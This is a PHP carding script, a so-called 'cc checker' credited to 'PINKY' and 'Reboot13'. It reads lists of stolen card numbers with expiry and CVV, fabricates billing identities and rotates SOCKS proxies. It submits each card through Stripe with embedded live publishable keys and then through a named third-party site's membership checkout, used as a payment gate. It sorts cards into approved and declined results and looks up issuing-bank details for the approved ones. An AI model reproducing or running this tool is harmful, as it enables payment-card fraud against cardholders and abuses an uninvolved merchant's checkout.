<?php
    
    error_reporting(0);
    
  //BY PINKY
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
  $lista = "$cc|$mes|$ano|$cvv";
  
    }

if($ano=="2020"){ 
  $ano="20";
}
else if($ano=="2021"){ 
  $ano="21";
}
else if($ano=="2022"){ 
  $ano="22";
}
else if($ano=="2023"){ 
  $ano="23";
}
else if($ano=="2024"){ 
  $ano="24";
}
else if($ano=="2025"){ 
  $ano="25";
}
else if($ano=="2026"){ 
  $ano="26";
}
else if($ano=="2027"){ 
  $ano="27";
}
else if($ano=="2028"){ 
  $ano="28";
}
else{
  $ano = "21";
}

$last = substr($cc, 12, 16);
  
  function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
  }
  
  
$bin = substr($cc, 0, 6);
$bin = getBin($bin);  
  function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    
      
                        
   $nome = dadosnome();
    $sobrenome = dadossobre();
   $email = $nome.$sobrenome.mt_rand(00,99);
    $stripped = preg_replace('/\s/', '', $email);
$email1 = strtolower($stripped);
    
   
   
    $keys = array(
  1 => 'pk_live_BzITKuEDSL0AOSLtNPh2MbCT00IbRBDfCX'
  ); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
function cyraxproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cyraxproxies();
$super_proxy = 'zproxy.lum-superproxy.io';
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
      
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        
/////////// [Bin Lookup Api] /////////////


/////////////////////////////////////PROXIES////////////////////////////////////////////////////

////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
////////////////////////////////////////////////////////////1 req/////////////////////////////////========================================
$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/v3/controller-76600170d298ea4d27a4c21942f52ae6.html'
));    
curl_setopt($ch, CURLOPT_POSTFIELDS, 
'type=card&billing_details[address][line1]='.$street.'&billing_details[address][line2]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][country]=AI&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e0d4ee99-4bf0-4d0a-8f9b-a5ac6443ad268e2957&muid=ecc18b91-20f3-42b5-a7f9-3896b9bc587706aa61&sid=dd6420a6-ab5f-4e82-9d99-20fbbb8b873ef83b5c&pasted_fields=number&payment_user_agent=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4&time_on_page=89858&referrer=https%3A%2F%2Fwww.greenbuilt.org%2Fregister%2Findividual-membership%2F%3Faction%3Dcheckout%26txn%3D15u&key=pk_live_4VbTP8fMPyykMKMen6eQaJ4Q00LQmpI5Wf');
$result1 = curl_exec($ch);
//echo "<b>1REQ Result:</b> $result1<br><br>"; 
//$a = json_decode($result1, true);
//$token = $a['data']['tokenizeCreditCard']['token'];

//echo<b> Message </b> $result"; 
$token = trim(strip_tags(getstr($result1,'"id": "','"')));
$message1 = trim(strip_tags(getstr($result1,'"message": "','"')));
//echo "$token";

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.greenbuilt.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.greenbuilt.org',
'accept: application/json, text/javascript, */*; q=0.01',
'origin: https://www.greenbuilt.org',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryzgR1sMZQ9XVtTUgE',
'referer: https://www.greenbuilt.org/register/individual-membership/?action=checkout&txn=15u'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="mepr_transaction_id"

1506
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="address_required"

1
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-one"

'.$street.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-two"

'.$street.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-city"

'.$city.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-country"

AI
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-state"

'.$state.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-address-zip"

'.$postcode.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="card-name"

'.$name.'+'.$last.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE
Content-Disposition: form-data; name="mepr_current_url"

https://www.greenbuilt.org/register/individual-membership/?action=checkout&txn=15u#mepr_jump
------WebKitFormBoundaryzgR1sMZQ9XVtTUgE--
');

$result = curl_exec($ch);
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$info = curl_getinfo($ch,CURLINFO_TOTAL_TIME);
$net = substr($info,0,4)."sec";



////$token = getStr($result2, '"message":"', '"');
////$code = getStr($result2, '"decline_code": "', '"');

    
    //////////////////////===[Card Response] 

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved_CVV</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED XxNavasxX 🐉 </span> </span> <span class="badge badge-info"> '.$bank.'  ('.$country.') </span> </br>';
}

elseif(strpos($result, "Your card's security code is incorrect." )) {
	 $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
  echo '<span class="badge badge-success">#Aprovada '.$lista.' | Informaci�n | BIN: '.$binn.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | PR�-PAGO : '.$prepago.' | <br>PHONE : '.$fone.' | TIPO : '.$tipo.' | LATITUDE : '.$latitude.' | LONGITUDE : '.$logitude.' | DATA: '.$data.' | GATE [Dragcchek] | DEBITOU: '.$debitouu.' cc checkers privado  </span>  </br>';
}

 
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge-info">#Reprovadas</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ Card Declined Dragcchek 🐉 </span> <span class="badge badge-info"> </span> <span class="badge badge-info"> '.$bank.'  ('.$country.') </span></br>';
}

 else {
  echo '<span class="new badge-info">#Reprovadas</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ Error Not Listed Dragcchek 🐉 </span> </br>';
}

curl_close($ch);
ob_flush();
////echo "<b>2REQ Result:</b> $result<br><br>";
//////=========Comment Echo $result If U Want To Hide Site Side Response


///////////////////////////////////////////////====== By Reboot13===============\\\\\\\\\\\\\\\
?>